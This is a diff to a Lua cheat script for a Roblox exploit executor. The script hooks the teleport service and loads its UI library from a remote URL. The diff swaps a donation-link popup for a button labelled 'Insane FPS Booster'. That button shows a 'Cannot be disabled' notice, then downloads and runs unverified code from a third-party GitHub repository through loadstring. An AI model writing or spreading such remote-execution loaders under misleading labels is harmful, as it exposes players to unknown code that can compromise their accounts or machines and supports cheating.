@@ -12,7 +12,7 @@ local oldTeleportInstance; oldTeleportInstance = hookfunction(TeleportService.Te
     return -- Cancela a execução da função
 end)
 
-print("Rejoin protection enabled")
+print("Rejoin protection enabled. God bless you!")
 
 local library = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/0x"))() -- aonde a library vai ficar armazenada
 
@@ -509,125 +509,15 @@ end)
 w1:Label("YT: PabloScripts21") -- Text
 
 w1:Button(
-    "wanna support me?",
+    "Insane FPS Booster",
     function()
-        local Players = game:GetService("Players")
-        local TweenService = game:GetService("TweenService")
-        local player = Players.LocalPlayer
-        local playerGui = player:FindFirstChild("PlayerGui")
-        if not playerGui then return end
-
-        -- Criar GUI principal
-        local screenGui = Instance.new("ScreenGui", playerGui)
-        screenGui.Name = "SupportPrompt"
-        screenGui.ResetOnSpawn = false
-
-        -- Frame principal
-        local frame = Instance.new("Frame", screenGui)
-        frame.Size = UDim2.new(0, 0, 0, 0) -- começa pequeno
-        frame.Position = UDim2.new(0.5, -125, 0.4, 0)
-        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-        frame.BackgroundTransparency = 0.2
-        frame.BorderSizePixel = 0
-
-        -- Arredondar bordas
-        local corner = Instance.new("UICorner", frame)
-        corner.CornerRadius = UDim.new(0, 12)
-
-        -- Aparecer com animação
-        TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-            Size = UDim2.new(0, 300, 0, 160)
-        }):Play()
-
-        -- Título
-        local title = Instance.new("TextLabel", frame)
-        title.Size = UDim2.new(1, 0, 0.3, 0)
-        title.Position = UDim2.new(0, 0, 0, 0)
-        title.Text = "For real?"
-        title.TextSize = 24
-        title.Font = Enum.Font.GothamBold
-        title.TextColor3 = Color3.fromRGB(255, 255, 255)
-        title.BackgroundTransparency = 1
-
-        -- Botões container
-        local buttonHolder = Instance.new("Frame", frame)
-        buttonHolder.Size = UDim2.new(1, 0, 0.5, 0)
-        buttonHolder.Position = UDim2.new(0, 0, 0.5, 0)
-        buttonHolder.BackgroundTransparency = 1
-
-        local layout = Instance.new("UIListLayout", buttonHolder)
-        layout.FillDirection = Enum.FillDirection.Horizontal
-        layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-        layout.VerticalAlignment = Enum.VerticalAlignment.Center
-        layout.Padding = UDim.new(0, 10)
-
-        local function createButton(text, color)
-            local button = Instance.new("TextButton")
-            button.Size = UDim2.new(0.45, 0, 1, 0)
-            button.Text = text
-            button.TextSize = 20
-            button.Font = Enum.Font.GothamBold
-            button.TextColor3 = Color3.new(1,1,1)
-            button.BackgroundColor3 = color
-            button.AutoButtonColor = true
-            button.BorderSizePixel = 0
-
-            local btnCorner = Instance.new("UICorner", button)
-            btnCorner.CornerRadius = UDim.new(0, 8)
-
-            return button
-        end
-
-        local yesBtn = createButton("Yes!", Color3.fromRGB(0, 200, 100))
-        local noBtn = createButton("No :(", Color3.fromRGB(200, 50, 50))
-
-        yesBtn.Parent = buttonHolder
-        noBtn.Parent = buttonHolder
-
-        -- Função para destruir com animação
-        local function destroyAnimated(guiElement)
-            TweenService:Create(guiElement, TweenInfo.new(0.3), {
-                Size = UDim2.new(0, 0, 0, 0)
-            }):Play()
-            task.wait(0.35)
-            guiElement:Destroy()
-        end
-
-        -- Clique em "Yes!"
-        yesBtn.MouseButton1Click:Connect(function()
-            if setclipboard then
-                setclipboard("https://link-center.net/1182489/sakura-swoop-autofarm")
-            end
-            destroyAnimated(frame)
-
-            -- Nova tela de agradecimento
-            local thanks = Instance.new("TextLabel", screenGui)
-            thanks.Size = UDim2.new(0, 0, 0, 0)
-            thanks.Position = UDim2.new(0.5, -150, 0.4, 0)
-            thanks.Text = "YAY! Link copied to clipboard :)"
-            thanks.TextSize = 22
-            thanks.Font = Enum.Font.GothamBold
-            thanks.TextColor3 = Color3.fromRGB(255, 255, 255)
-            thanks.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-            thanks.BackgroundTransparency = 0.2
-            thanks.BorderSizePixel = 0
-
-            local corner2 = Instance.new("UICorner", thanks)
-            corner2.CornerRadius = UDim.new(0, 10)
-
-            TweenService:Create(thanks, TweenInfo.new(0.3), {
-                Size = UDim2.new(0, 350, 0, 60)
-            }):Play()
-
-            task.wait(5)
-            destroyAnimated(thanks)
-            screenGui:Destroy()
-        end)
-
-        -- Clique em "No"
-        noBtn.MouseButton1Click:Connect(function()
-            destroyAnimated(frame)
-        end)
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "God is good",
+            Text = "Cannot be disabled",
+            Button1 = "I love Jesus",
+            Duration = 5
+        })
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/SapienNotSmart/roblox-insane-fps-booster/refs/heads/main/fps%20booster%20script'))()
     end
 )
 
